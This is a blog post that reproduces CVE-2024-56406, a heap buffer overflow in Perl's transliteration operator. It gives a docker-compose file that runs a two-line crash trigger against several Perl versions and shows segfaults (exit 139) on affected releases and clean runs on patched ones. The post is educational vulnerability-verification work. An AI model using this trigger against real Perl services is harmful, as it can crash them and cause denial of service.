---
title: "CVE-2024-56406"
date: 2025-05-17T00:00:00+00:00
description: "Discussion about the CVE-2024-56406."
type: post
image: images/blog/cve-2024-56406.png
author: Mohammad Sajid Anwar
tags: ["perl"]
---

#### **DISCLAIMER:** Image is generated using `FREE` version of `ChatGPT`.
***

<br>

In the earlier [**post**](/blog/cve-in-perl) where I discussed `CVE` in general and re-created `CVE-2018-18311`, `CVE-2023-31486` and `CVE-2023-47038`.

Continuing with the series, today I am talking about one more `CVE-2024-56406`.

This particular one affected `v5.34`, `v5.36`, `v5.38` and `v5.40`.

It's about heap buffer overflow when transliterating non-ASCII bytes.

According to the [**official document**](https://lists.security.metacpan.org/cve-announce/msg/28708725), the affected versions are below:

<br>

```bash
    from 5.40.0 until 5.40.2
    from 5.38.0 until 5.38.4
    from 5.36.0 through 5.36.3
    from 5.34.0 through 5.34.3
```

<br>

I will use the similar pattern as before and create docker container with affected `Perl` versions.

In that, I'll also add couple of good ones as well.

This is my docker configuration file: `docker-compose.yml`

<br>

```bash
version: '3.8'

services:
  perl_5_34_0:
    container_name: perl_5_34_0
    image: perl:5.34.0
    command:
      - perl
      - -e
      - |
        $$m = "\x{FF}" x 1000000;
        $$m =~ tr/\xFF/\x{100}/;
        print "If you see this, Perl didn't crash!!\n";
    deploy:
      resources:
        limits:
          memory: 2G

  perl_5_36_0:
    container_name: perl_5_36_0
    image: perl:5.36.0
    command:
      - perl
      - -e
      - |
        $$m = "\x{FF}" x 1000000;
        $$m =~ tr/\xFF/\x{100}/;
        print "If you see this, Perl didn't crash!!\n";
    deploy:
      resources:
        limits:
          memory: 2G

  perl_5_38_0:
    container_name: perl_5_38_0
    image: perl:5.38.0
    command:
      - perl
      - -e
      - |
        $$m = "\x{FF}" x 1000000;
        $$m =~ tr/\xFF/\x{100}/;
        print "If you see this, Perl didn't crash!!\n";
    deploy:
      resources:
        limits:
          memory: 2G

  perl_5_38_4:
    container_name: perl_5_38_4
    image: perl:5.38.4
    command:
      - perl
      - -e
      - |
        $$m = "\x{FF}" x 1000000;
        $$m =~ tr/\xFF/\x{100}/;
        print "If you see this, Perl didn't crash!!\n";
    deploy:
      resources:
        limits:
          memory: 2G

  perl_5_40_0:
    container_name: perl_5_40_0
    image: perl:5.40.0
    command:
      - perl
      - -e
      - |
        $$m = "\x{FF}" x 1000000;
        $$m =~ tr/\xFF/\x{100}/;
        print "If you see this, Perl didn't crash!!\n";
    deploy:
      resources:
        limits:
          memory: 2G

  perl_5_40_2:
    container_name: perl_5_40_2
    image: perl:5.40.2
    command:
      - perl
      - -e
      - |
        $$m = "\x{FF}" x 1000000;
        $$m =~ tr/\xFF/\x{100}/;
        print "If you see this, Perl didn't crash!!\n";
    deploy:
      resources:
        limits:
          memory: 2G
```

<br>

In summary, I am creating the following services that would throw error as expected:

<br>

```bash
    perl_5_34_0
    perl_5_36_0
    perl_5_38_0
    perl_5_40_0
```

<br>

There are two more services `perl_5_38_4` and `perl_5_40_2` which should be safe and unaffected.

<br>

Finally it's time to re-create the issues.

<br>

```bash
$ docker-compose run -rm perl_5_34_0
Creating cve-2024-56406_perl_5_34_0_run ... done
ERROR: 139
```

<br>

```bash
$ docker-compose run -rm perl_5_36_0
Creating cve-2024-56406_perl_5_36_0_run ... done
ERROR: 139
```

<br>

```bash
$ docker-compose run -rm perl_5_38_0
Creating cve-2024-56406_perl_5_38_0_run ... done
ERROR: 139
```

<br>

```bash
$ docker-compose run -rm perl_5_40_0
Creating cve-2024-56406_perl_5_40_0_run ... done
ERROR: 139
```

<br>

If you noticed, the exit code is `139` in the affected services.

As we know, `Exit Code = Signal Number + 128` and the `segfault` signal number is `11`.

And the good ones are:

<br>

```bash
$ docker-compose run -rm perl_5_38_4
Creating cve-2024-56406_perl_5_38_4_run ... done
If you see this, Perl didn't crash!!
```

<br>

```bash
$ docker-compose run -rm perl_5_40_2
Creating cve-2024-56406_perl_5_40_2_run ... done
If you see this, Perl didn't crash!!
```

<br>

***

<br>

`Happy Hacking !!!`
